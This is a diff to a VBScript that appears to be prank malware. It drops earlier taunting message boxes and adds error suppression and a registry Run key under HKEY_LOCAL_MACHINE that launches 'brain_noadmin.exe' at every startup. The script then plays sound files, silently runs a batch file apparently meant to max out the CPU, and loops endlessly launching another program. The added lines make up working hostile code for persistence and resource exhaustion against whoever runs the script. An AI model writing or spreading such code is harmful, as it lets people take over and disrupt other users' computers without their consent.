@@ -1,14 +1,18 @@
-MsgBox "You will have Oooooooooooooo AAAAAAEEEE3E-AAAAA-AAA-1AU- JOOOOOOOOOOOOOOOOOOOOOOOO AEEEEEEEOAAAAAAATUAAA EEEEEEEEEEEEEE AAAAAAAAAAAAAAAAEIOE JOOOOOOOOOOOOOOO tonight", vbInformation+vbOKOnly+vbMsgBoxSetForeground + vbDefaultButton1, ""
+On Error Resume Next
+Dim temp,ret
+dim ws 
+Set ws=CreateObject("Wscript.Shell") 
+Dim runKey,runPath 
+runKey = "win"
+runPath = createobject("Scripting.FileSystemObject").GetFolder(".").Path+"\brain_noadmin.exe"
 
-wscript.echo "ARE U READY"
+ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"&runKey,runPath 
 
 Set Player = CreateObject("wmplayer.ocx") 
 Player.URL = "init.wav"
 Do Until Player.playState = 1
 WScript.Sleep 1
 Loop
-
-wscript.echo "HERE WE GO"
 
 set ws=createobject("wscript.shell") 
 
@@ -17,7 +21,5 @@ Player.url = "233.wav"
 ws.run "100cpu.bat",0,false
 do until Player.playState = 1 
 ws.run "swallow",1,true
-'wscript.sleep 1
 loop
-
 loop
